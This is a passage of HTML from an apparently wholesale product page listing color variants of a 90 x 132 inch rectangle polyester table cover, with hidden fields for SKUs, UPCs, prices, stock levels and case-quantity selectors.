                                                <span id="pr_series_number_14" style="display:none;">38-0026MA</span>
                                                <span id="pr_series_image_14" style="display:none;">https://portofino.azureedge.net/38-0026MA.jpg</span>
                                                <span id="pr_series_upc_14" style="display:none;">745910744582</span>
                                                <span id="pr_series_case_price_14" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_14" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_14" style="display:none;"></span>
                                                <span id="pr_series_discount_2_14" style="display:none;"></span>
                                                <span id="pr_series_availability_14" style="display:none;">8 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(14);">
                                                        <img src="uploads/palette/20140730193247CROSS.jpg" width="31">&nbsp;(MA) St. Marta										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026MA">
                                                        <input type="hidden" name="item_name[38-0026MA]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Magenta">
                                                        <input type="hidden" name="item_image[38-0026MA]" value="https://portofino.azureedge.net/38-0026MA.jpg">
                                                        <input type="hidden" name="item_class[38-0026MA]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026MA]" value="745910744582">
                                                        <input type="hidden" name="color[38-0026MA]" value="MA">
                                                        <input type="hidden" name="discount[38-0026MA]" value="">
                                                        <input type="hidden" name="discount_2[38-0026MA]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026MA]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026MA]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026MA]" value="">
                                                        <input type="hidden" name="isSale[38-0026MA]" value="0">
                                                        <input type="hidden" name="isNew[38-0026MA]" value="">
                                                        <input type="hidden" name="isBack[38-0026MA]" value="">
                                                        <select class="item_total_qty" id="color-total-14" name="total_qty[38-0026MA]" onchange="moreQty(this.value, '96','38-0026MA',14);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-14" name="request_qty[38-0026MA]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_15" style="display:none;">38-0026MV</span>
                                                <span id="pr_series_image_15" style="display:none;">https://portofino.azureedge.net/38-0026MV.jpg</span>
                                                <span id="pr_series_upc_15" style="display:none;">745910743431</span>
                                                <span id="pr_series_case_price_15" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_15" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_15" style="display:none;"></span>
                                                <span id="pr_series_discount_2_15" style="display:none;"></span>
                                                <span id="pr_series_availability_15" style="display:none;">32 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(15);">
                                                        <img src="uploads/palette/20140707133313MV.jpg" width="31">&nbsp;(MV) Mauve										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026MV">
                                                        <input type="hidden" name="item_name[38-0026MV]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Mauve">
                                                        <input type="hidden" name="item_image[38-0026MV]" value="https://portofino.azureedge.net/38-0026MV.jpg">
                                                        <input type="hidden" name="item_class[38-0026MV]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026MV]" value="745910743431">
                                                        <input type="hidden" name="color[38-0026MV]" value="MV">
                                                        <input type="hidden" name="discount[38-0026MV]" value="">
                                                        <input type="hidden" name="discount_2[38-0026MV]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026MV]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026MV]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026MV]" value="">
                                                        <input type="hidden" name="isSale[38-0026MV]" value="0">
                                                        <input type="hidden" name="isNew[38-0026MV]" value="">
                                                        <input type="hidden" name="isBack[38-0026MV]" value="">
                                                        <select class="item_total_qty" id="color-total-15" name="total_qty[38-0026MV]" onchange="moreQty(this.value, '384','38-0026MV',15);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                            <option value="132">132 (11 cases)</option>
                                                            <option value="144">144 (12 cases)</option>
                                                            <option value="156">156 (13 cases)</option>
                                                            <option value="168">168 (14 cases)</option>
                                                            <option value="180">180 (15 cases)</option>
                                                            <option value="192">192 (16 cases)</option>
                                                            <option value="204">204 (17 cases)</option>
                                                            <option value="216">216 (18 cases)</option>
                                                            <option value="228">228 (19 cases)</option>
                                                            <option value="240">240 (20 cases)</option>
                                                            <option value="252">252 (21 cases)</option>
                                                            <option value="264">264 (22 cases)</option>
                                                            <option value="276">276 (23 cases)</option>
                                                            <option value="288">288 (24 cases)</option>
                                                            <option value="300">300 (25 cases)</option>
                                                            <option value="312">312 (26 cases)</option>
                                                            <option value="324">324 (27 cases)</option>
                                                            <option value="336">336 (28 cases)</option>
                                                            <option value="348">348 (29 cases)</option>
                                                            <option value="360">360 (30 cases)</option>
                                                            <option value="372">372 (31 cases)</option>
                                                            <option value="384">384 (32 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-15" name="request_qty[38-0026MV]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_16" style="display:none;">38-0026NV</span>
                                                <span id="pr_series_image_16" style="display:none;">https://portofino.azureedge.net/38-0026NV.jpg</span>
                                                <span id="pr_series_upc_16" style="display:none;">745910743325</span>
                                                <span id="pr_series_case_price_16" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_16" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_16" style="display:none;"></span>
                                                <span id="pr_series_discount_2_16" style="display:none;"></span>
                                                <span id="pr_series_availability_16" style="display:none;">6 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(16);">
                                                        <img src="uploads/palette/20150505155706NB.jpg" width="31">&nbsp;(NV) Navy										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026NV">
                                                        <input type="hidden" name="item_name[38-0026NV]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Navy">
                                                        <input type="hidden" name="item_image[38-0026NV]" value="https://portofino.azureedge.net/38-0026NV.jpg">
                                                        <input type="hidden" name="item_class[38-0026NV]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026NV]" value="745910743325">
                                                        <input type="hidden" name="color[38-0026NV]" value="NV">
                                                        <input type="hidden" name="discount[38-0026NV]" value="">
                                                        <input type="hidden" name="discount_2[38-0026NV]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026NV]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026NV]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026NV]" value="">
                                                        <input type="hidden" name="isSale[38-0026NV]" value="0">
                                                        <input type="hidden" name="isNew[38-0026NV]" value="">
                                                        <input type="hidden" name="isBack[38-0026NV]" value="">
                                                        <select class="item_total_qty" id="color-total-16" name="total_qty[38-0026NV]" onchange="moreQty(this.value, '72','38-0026NV',16);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-16" name="request_qty[38-0026NV]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_17" style="display:none;">38-0026OR</span>
                                                <span id="pr_series_image_17" style="display:none;">https://portofino.azureedge.net/38-0026OR.jpg</span>
                                                <span id="pr_series_upc_17" style="display:none;">745910743424</span>
                                                <span id="pr_series_case_price_17" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_17" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_17" style="display:none;"></span>
                                                <span id="pr_series_discount_2_17" style="display:none;"></span>
                                                <span id="pr_series_availability_17" style="display:none;">7 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(17);">
                                                        <img src="uploads/palette/20140523040241or.jpg" width="31">&nbsp;(OR) Orange										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026OR">
                                                        <input type="hidden" name="item_name[38-0026OR]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot;- Orange">
                                                        <input type="hidden" name="item_image[38-0026OR]" value="https://portofino.azureedge.net/38-0026OR.jpg">
                                                        <input type="hidden" name="item_class[38-0026OR]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026OR]" value="745910743424">
                                                        <input type="hidden" name="color[38-0026OR]" value="OR">
                                                        <input type="hidden" name="discount[38-0026OR]" value="">
                                                        <input type="hidden" name="discount_2[38-0026OR]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026OR]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026OR]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026OR]" value="">
                                                        <input type="hidden" name="isSale[38-0026OR]" value="0">
                                                        <input type="hidden" name="isNew[38-0026OR]" value="">
                                                        <input type="hidden" name="isBack[38-0026OR]" value="Y">
                                                        <select class="item_total_qty" id="color-total-17" name="total_qty[38-0026OR]" onchange="moreQty(this.value, '84','38-0026OR',17);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-17" name="request_qty[38-0026OR]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_18" style="display:none;">38-0026PK</span>
                                                <span id="pr_series_image_18" style="display:none;">https://portofino.azureedge.net/38-0026PK.jpg</span>
                                                <span id="pr_series_upc_18" style="display:none;">745910743370</span>
                                                <span id="pr_series_case_price_18" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_18" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_18" style="display:none;"></span>
                                                <span id="pr_series_discount_2_18" style="display:none;"></span>
                                                <span id="pr_series_availability_18" style="display:none;">2 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(18);">
                                                        <img src="uploads/palette/20140707134456PK.jpg" width="31">&nbsp;(PK) Pink										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026PK">
                                                        <input type="hidden" name="item_name[38-0026PK]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Pink">
                                                        <input type="hidden" name="item_image[38-0026PK]" value="https://portofino.azureedge.net/38-0026PK.jpg">
                                                        <input type="hidden" name="item_class[38-0026PK]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026PK]" value="745910743370">
                                                        <input type="hidden" name="color[38-0026PK]" value="PK">
                                                        <input type="hidden" name="discount[38-0026PK]" value="">
                                                        <input type="hidden" name="discount_2[38-0026PK]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026PK]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026PK]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026PK]" value="">
                                                        <input type="hidden" name="isSale[38-0026PK]" value="0">
                                                        <input type="hidden" name="isNew[38-0026PK]" value="">
                                                        <input type="hidden" name="isBack[38-0026PK]" value="">
                                                        <select class="item_total_qty" id="color-total-18" name="total_qty[38-0026PK]" onchange="moreQty(this.value, '24','38-0026PK',18);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-18" name="request_qty[38-0026PK]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_19" style="display:none;">38-0026PU</span>
                                                <span id="pr_series_image_19" style="display:none;">https://portofino.azureedge.net/38-0026PU.jpg</span>
                                                <span id="pr_series_upc_19" style="display:none;">745910743349</span>
                                                <span id="pr_series_case_price_19" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_19" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_19" style="display:none;"></span>
                                                <span id="pr_series_discount_2_19" style="display:none;"></span>
                                                <span id="pr_series_availability_19" style="display:none;">8 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(19);">
                                                        <img src="uploads/palette/20140707144313PU.jpg" width="31">&nbsp;(PU) Purple										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026PU">
                                                        <input type="hidden" name="item_name[38-0026PU]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Purple">
                                                        <input type="hidden" name="item_image[38-0026PU]" value="https://portofino.azureedge.net/38-0026PU.jpg">
                                                        <input type="hidden" name="item_class[38-0026PU]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026PU]" value="745910743349">
                                                        <input type="hidden" name="color[38-0026PU]" value="PU">
                                                        <input type="hidden" name="discount[38-0026PU]" value="">
                                                        <input type="hidden" name="discount_2[38-0026PU]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026PU]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026PU]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026PU]" value="">
                                                        <input type="hidden" name="isSale[38-0026PU]" value="0">
                                                        <input type="hidden" name="isNew[38-0026PU]" value="">
                                                        <input type="hidden" name="isBack[38-0026PU]" value="">
                                                        <select class="item_total_qty" id="color-total-19" name="total_qty[38-0026PU]" onchange="moreQty(this.value, '96','38-0026PU',19);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-19" name="request_qty[38-0026PU]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_20" style="display:none;">38-0026RB</span>
                                                <span id="pr_series_image_20" style="display:none;">https://portofino.azureedge.net/38-0026RB.jpg</span>
                                                <span id="pr_series_upc_20" style="display:none;">745910743356</span>
                                                <span id="pr_series_case_price_20" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_20" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_20" style="display:none;"></span>
                                                <span id="pr_series_discount_2_20" style="display:none;"></span>
                                                <span id="pr_series_availability_20" style="display:none;">17 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(20);">
                                                        <img src="uploads/palette/20140523040440rb.jpg" width="31">&nbsp;(RB) Royal Blue										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026RB">
                                                        <input type="hidden" name="item_name[38-0026RB]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Royal Blue">
                                                        <input type="hidden" name="item_image[38-0026RB]" value="https://portofino.azureedge.net/38-0026RB.jpg">
                                                        <input type="hidden" name="item_class[38-0026RB]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026RB]" value="745910743356">
                                                        <input type="hidden" name="color[38-0026RB]" value="RB">
                                                        <input type="hidden" name="discount[38-0026RB]" value="">
                                                        <input type="hidden" name="discount_2[38-0026RB]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026RB]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026RB]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026RB]" value="">
                                                        <input type="hidden" name="isSale[38-0026RB]" value="0">
                                                        <input type="hidden" name="isNew[38-0026RB]" value="">
                                                        <input type="hidden" name="isBack[38-0026RB]" value="">
                                                        <select class="item_total_qty" id="color-total-20" name="total_qty[38-0026RB]" onchange="moreQty(this.value, '204','38-0026RB',20);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                            <option value="132">132 (11 cases)</option>
                                                            <option value="144">144 (12 cases)</option>
                                                            <option value="156">156 (13 cases)</option>
                                                            <option value="168">168 (14 cases)</option>
                                                            <option value="180">180 (15 cases)</option>
                                                            <option value="192">192 (16 cases)</option>
                                                            <option value="204">204 (17 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-20" name="request_qty[38-0026RB]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_21" style="display:none;">38-0026RD</span>
                                                <span id="pr_series_image_21" style="display:none;">https://portofino.azureedge.net/38-0026RD.jpg</span>
                                                <span id="pr_series_upc_21" style="display:none;">745910734804</span>
                                                <span id="pr_series_case_price_21" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_21" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_21" style="display:none;"></span>
                                                <span id="pr_series_discount_2_21" style="display:none;"></span>
                                                <span id="pr_series_availability_21" style="display:none;">0 Case and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(21);">
                                                        <img src="uploads/palette/20140707134422RD.jpg" width="31">&nbsp;(RD) Red										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026RD">
                                                        <input type="hidden" name="item_name[38-0026RD]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Red">
                                                        <input type="hidden" name="item_image[38-0026RD]" value="https://portofino.azureedge.net/38-0026RD.jpg">
                                                        <input type="hidden" name="item_class[38-0026RD]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026RD]" value="745910734804">
                                                        <input type="hidden" name="color[38-0026RD]" value="RD">
                                                        <input type="hidden" name="discount[38-0026RD]" value="">
                                                        <input type="hidden" name="discount_2[38-0026RD]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026RD]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026RD]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026RD]" value="">
                                                        <input type="hidden" name="isSale[38-0026RD]" value="0">
                                                        <input type="hidden" name="isNew[38-0026RD]" value="">
                                                        <input type="hidden" name="isBack[38-0026RD]" value="">
                                                        <select class="item_total_qty" id="color-total-21" name="total_qty[38-0026RD]" onchange="moreQty(this.value, '0','38-0026RD',21);">
                                                            <option value="0"></option>
                                                        </select>
                                                        <input type="hidden" id="color-request-21" name="request_qty[38-0026RD]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_22" style="display:none;">38-0026SG</span>
                                                <span id="pr_series_image_22" style="display:none;">https://portofino.azureedge.net/38-0026SG.jpg</span>
                                                <span id="pr_series_upc_22" style="display:none;">745910743448</span>
                                                <span id="pr_series_case_price_22" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_22" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_22" style="display:none;"></span>
                                                <span id="pr_series_discount_2_22" style="display:none;"></span>
                                                <span id="pr_series_availability_22" style="display:none;">1 Case and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(22);">
                                                        <img src="uploads/palette/20140523040908sg.jpg" width="31">&nbsp;(SG) Sage										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026SG">
                                                        <input type="hidden" name="item_name[38-0026SG]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Sage">
                                                        <input type="hidden" name="item_image[38-0026SG]" value="https://portofino.azureedge.net/38-0026SG.jpg">
                                                        <input type="hidden" name="item_class[38-0026SG]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026SG]" value="745910743448">
                                                        <input type="hidden" name="color[38-0026SG]" value="SG">
                                                        <input type="hidden" name="discount[38-0026SG]" value="">
                                                        <input type="hidden" name="discount_2[38-0026SG]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026SG]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026SG]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026SG]" value="">
                                                        <input type="hidden" name="isSale[38-0026SG]" value="0">
                                                        <input type="hidden" name="isNew[38-0026SG]" value="">
                                                        <input type="hidden" name="isBack[38-0026SG]" value="">
                                                        <select class="item_total_qty" id="color-total-22" name="total_qty[38-0026SG]" onchange="moreQty(this.value, '12','38-0026SG',22);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-22" name="request_qty[38-0026SG]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_23" style="display:none;">38-0026SV</span>
                                                <span id="pr_series_image_23" style="display:none;">https://portofino.azureedge.net/38-0026SV.jpg</span>
                                                <span id="pr_series_upc_23" style="display:none;">745910734828</span>
                                                <span id="pr_series_case_price_23" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_23" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_23" style="display:none;"></span>
                                                <span id="pr_series_discount_2_23" style="display:none;"></span>
                                                <span id="pr_series_availability_23" style="display:none;">12 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(23);">
                                                        <img src="uploads/palette/20140523040739sv.jpg" width="31">&nbsp;(SV) Silver										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026SV">
                                                        <input type="hidden" name="item_name[38-0026SV]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Silver">
                                                        <input type="hidden" name="item_image[38-0026SV]" value="https://portofino.azureedge.net/38-0026SV.jpg">
                                                        <input type="hidden" name="item_class[38-0026SV]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026SV]" value="745910734828">
                                                        <input type="hidden" name="color[38-0026SV]" value="SV">
                                                        <input type="hidden" name="discount[38-0026SV]" value="">
                                                        <input type="hidden" name="discount_2[38-0026SV]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026SV]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026SV]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026SV]" value="">
                                                        <input type="hidden" name="isSale[38-0026SV]" value="0">
                                                        <input type="hidden" name="isNew[38-0026SV]" value="">
                                                        <input type="hidden" name="isBack[38-0026SV]" value="">
                                                        <select class="item_total_qty" id="color-total-23" name="total_qty[38-0026SV]" onchange="moreQty(this.value, '144','38-0026SV',23);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                            <option value="132">132 (11 cases)</option>
                                                            <option value="144">144 (12 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-23" name="request_qty[38-0026SV]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_24" style="display:none;">38-0026TBL</span>
                                                <span id="pr_series_image_24" style="display:none;">https://portofino.azureedge.net/38-0026TBL.jpg</span>
                                                <span id="pr_series_upc_24" style="display:none;">745910743318</span>
                                                <span id="pr_series_case_price_24" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_24" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_24" style="display:none;"></span>
                                                <span id="pr_series_discount_2_24" style="display:none;"></span>
                                                <span id="pr_series_availability_24" style="display:none;">3 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(24);">
                                                        <img src="uploads/palette/" width="31">&nbsp;() 										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026TBL">
                                                        <input type="hidden" name="item_name[38-0026TBL]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Modern Blue">
                                                        <input type="hidden" name="item_image[38-0026TBL]" value="https://portofino.azureedge.net/38-0026TBL.jpg">
                                                        <input type="hidden" name="item_class[38-0026TBL]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026TBL]" value="745910743318">
                                                        <input type="hidden" name="color[38-0026TBL]" value="TBL">
                                                        <input type="hidden" name="discount[38-0026TBL]" value="">
                                                        <input type="hidden" name="discount_2[38-0026TBL]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026TBL]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026TBL]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026TBL]" value="">
                                                        <input type="hidden" name="isSale[38-0026TBL]" value="0">
                                                        <input type="hidden" name="isNew[38-0026TBL]" value="">
                                                        <input type="hidden" name="isBack[38-0026TBL]" value="">
                                                        <select class="item_total_qty" id="color-total-24" name="total_qty[38-0026TBL]" onchange="moreQty(this.value, '36','38-0026TBL',24);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-24" name="request_qty[38-0026TBL]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_25" style="display:none;">38-0026TQ</span>
                                                <span id="pr_series_image_25" style="display:none;">https://portofino.azureedge.net/38-0026TQ.jpg</span>
                                                <span id="pr_series_upc_25" style="display:none;">745910743394</span>
                                                <span id="pr_series_case_price_25" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_25" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_25" style="display:none;"></span>
                                                <span id="pr_series_discount_2_25" style="display:none;"></span>
                                                <span id="pr_series_availability_25" style="display:none;">18 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(25);">
                                                        <img src="uploads/palette/20140707134443TQ.jpg" width="31">&nbsp;(TQ) Turquoise										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026TQ">
                                                        <input type="hidden" name="item_name[38-0026TQ]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Turquoise">
                                                        <input type="hidden" name="item_image[38-0026TQ]" value="https://portofino.azureedge.net/38-0026TQ.jpg">
                                                        <input type="hidden" name="item_class[38-0026TQ]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026TQ]" value="745910743394">
                                                        <input type="hidden" name="color[38-0026TQ]" value="TQ">
                                                        <input type="hidden" name="discount[38-0026TQ]" value="">
                                                        <input type="hidden" name="discount_2[38-0026TQ]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026TQ]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026TQ]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026TQ]" value="">
                                                        <input type="hidden" name="isSale[38-0026TQ]" value="0">
                                                        <input type="hidden" name="isNew[38-0026TQ]" value="">
                                                        <input type="hidden" name="isBack[38-0026TQ]" value="">
                                                        <select class="item_total_qty" id="color-total-25" name="total_qty[38-0026TQ]" onchange="moreQty(this.value, '216','38-0026TQ',25);">
                                                            <option value="0"></option>
